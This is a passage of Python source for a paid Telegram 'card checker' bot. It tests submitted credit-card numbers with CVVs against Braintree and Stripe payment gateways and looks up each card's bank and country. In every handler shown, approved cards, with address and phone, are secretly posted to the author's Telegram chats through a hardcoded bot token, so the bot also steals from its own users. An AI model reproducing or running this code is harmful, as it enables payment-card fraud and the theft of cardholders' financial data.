		mg = f"""<b> 
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='Braintree Auth'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz </b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''
	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tlg_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tlg_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
		
		#بدايه اتسرايب اتشارج 2
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chr') or message.text.lower().startswith('/chr'))
def respond_to_vbv(message):
	gate='𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘2'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(ch(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz </b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''
	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acc =  '-1002111411217'
		mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tlg_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tlg_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
		#نهايه استرايب اتشارج 2
		
@bot.message_handler(func=lambda message: message.text.lower().startswith('.cc') or message.text.lower().startswith('/cc'))
def respond_to_vbv(message):
	gate='Braintree Auth 2 '
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/Moha_Azouz")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/PHP_BL")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele2(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz </b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
⸙ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
⸙ 𝘽𝙞𝙣 𝙄𝙣𝙛𝙤 ➼ {cc[:6]} - {card_type} - {brand}- {level}
⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
⸙ 𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz </b>'''
